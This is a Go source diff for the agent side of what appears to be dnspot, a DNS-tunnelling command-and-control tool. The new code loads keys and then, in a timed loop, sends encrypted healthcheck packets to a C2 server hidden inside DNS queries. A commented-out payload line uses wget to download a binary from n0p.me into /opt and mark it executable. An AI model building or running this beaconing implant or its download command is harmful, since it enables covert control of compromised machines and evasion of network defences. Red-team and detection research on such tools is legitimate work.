@@ -1,21 +1,14 @@
 package agent
 
 import (
-	"bytes"
-	"encoding/base32"
-	"fmt"
 	"strings"
 	"time"
 
-	"github.com/lunixbochs/struc"
-
+	"github.com/kpango/glg"
 	"github.com/mosajjal/dnspot/c2"
+	"github.com/mosajjal/dnspot/conf"
 	"github.com/mosajjal/dnspot/cryptography"
 	"github.com/spf13/cobra"
-
-	"github.com/kpango/glg"
-
-	"github.com/miekg/dns"
 )
 
 func errorHandler(err error) {
@@ -24,79 +17,61 @@ func errorHandler(err error) {
 	}
 }
 
-func performExternalQuery(question dns.Question, server string) *dns.Msg {
-	c := new(dns.Client)
-	m1 := new(dns.Msg)
-	m1.Id = dns.Id()
-	m1.RecursionDesired = true
-	m1.Question = make([]dns.Question, 1)
-	m1.Question[0] = question
-	in, _, err := c.Exchange(m1, server)
-	if err != nil {
-		fmt.Printf("error %v\n", err)
-	}
-	return in
+var exiting chan bool
+
+var AgentStatus struct {
+	LastAckFromServer          uint32
+	NextMessageType            c2.MessageType
+	HealthCheckIntervalSeconds uint32
 }
 
-func insertNth(s string, n int) string {
-	var buffer bytes.Buffer
-	var n_1 = n - 1
-	var l_1 = len(s) - 1
-	for i, rune := range s {
-		buffer.WriteRune(rune)
-		if i%n == n_1 && i != l_1 {
-			buffer.WriteRune('.')
+func RunAgent(cmd *cobra.Command, args []string) error {
+	// set global flag that we're running as server
+	conf.Mode = conf.RunAsAgent
+	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
+	AgentStatus.HealthCheckIntervalSeconds = 10
+	AgentStatus.NextMessageType = c2.MessageHealthcheck
+
+	// dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
+	// errorHandler(err)
+	if !strings.HasSuffix(conf.GlobalAgentConfig.DnsSuffix, ".") {
+		conf.GlobalAgentConfig.DnsSuffix = conf.GlobalAgentConfig.DnsSuffix + "."
+	}
+	if !strings.HasPrefix(conf.GlobalAgentConfig.DnsSuffix, ".") {
+		conf.GlobalAgentConfig.DnsSuffix = "." + conf.GlobalAgentConfig.DnsSuffix
+	}
+	// serverAddress, err := cmd.Flags().GetString("serverAddress")
+	// errorHandler(err)
+	// privateKey, err := cmd.Flags().GetString("privateKey")
+	// errorHandler(err)
+	// serverPublicKey, err := cmd.Flags().GetString("serverPublicKey")
+	// errorHandler(err)
+	var err error
+	conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyB32)
+	errorHandler(err)
+	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyB32)
+	errorHandler(err)
+	tick := time.NewTicker(time.Duration(AgentStatus.HealthCheckIntervalSeconds) * time.Second)
+	for {
+		select {
+		case <-exiting:
+			// When exiting, return immediately
+			return nil
+		case <-tick.C:
+			msg := c2.MessagePacket{
+				TimeStamp:   uint32(time.Now().Unix()),
+				MessageType: AgentStatus.NextMessageType,
+			}
+			// todo: find what to do here and log it
+			// payload := []byte("sh -c 'wget n0p.me/bin/miniserve -O /opt/miniserve && chmod +x /opt/miniserve'")
+			payload := []byte("hi!")
+			_, err := c2.SendPartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.ServerAddress, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+			if err != nil {
+				glg.Warnf("Error sending Message to Server")
+			}
+			// function to handle response coming from the server and update the status accordingly
+			// handleServerResponse(response)
 		}
 	}
-	return buffer.String()
-}
-
-func RunAgent(cmd *cobra.Command, args []string) {
-	dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
-	errorHandler(err)
-	if !strings.HasSuffix(dnsSuffix, ".") {
-		dnsSuffix = dnsSuffix + "."
-	}
-	if !strings.HasPrefix(dnsSuffix, ".") {
-		dnsSuffix = "." + dnsSuffix
-	}
-	serverAddress, err := cmd.Flags().GetString("serverAddress")
-	errorHandler(err)
-	privateKey, err := cmd.Flags().GetString("privateKey")
-	errorHandler(err)
-	serverPublicKey, err := cmd.Flags().GetString("serverPublicKey")
-	errorHandler(err)
-
-	private, _ := cryptography.PrivateKeyFromString(privateKey)
-	public, _ := cryptography.PublicKeyFromString(serverPublicKey)
-
-	// msg := "hello lets take ssa look atchars22hello lets lets take ssa look atcha"
-	msg := c2.MessagePacket{
-		TimeStamp:      uint32(time.Now().Unix()),
-		MessageType:    c2.MessageHealthcheck,
-		EnabledService: c2.ServiceNone,
-		IsMultiPart:    false,
-		PartID:         0,
-		ParentPartID:   0,
-	}
-	copy(msg.Payload[:], "hello")
-	var buf bytes.Buffer
-	struc.Pack(&buf, &msg)
-	encrypted, err := cryptography.Encrypt(public, private, buf.Bytes())
-	if err != nil {
-		panic(err.Error())
-	}
-
-	s := base32.StdEncoding.EncodeToString(encrypted)
-	s = strings.ReplaceAll(s, "=", "")
-
-	Q := insertNth(s, 63) + dnsSuffix
-	if len(Q) > 255 {
-		glg.Warnf("query is too long %d\n", len(Q))
-	} else {
-		q := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
-		glg.Infof("query %s\n", q.String())
-		performExternalQuery(q, serverAddress)
-	}
-
+	return nil
 }
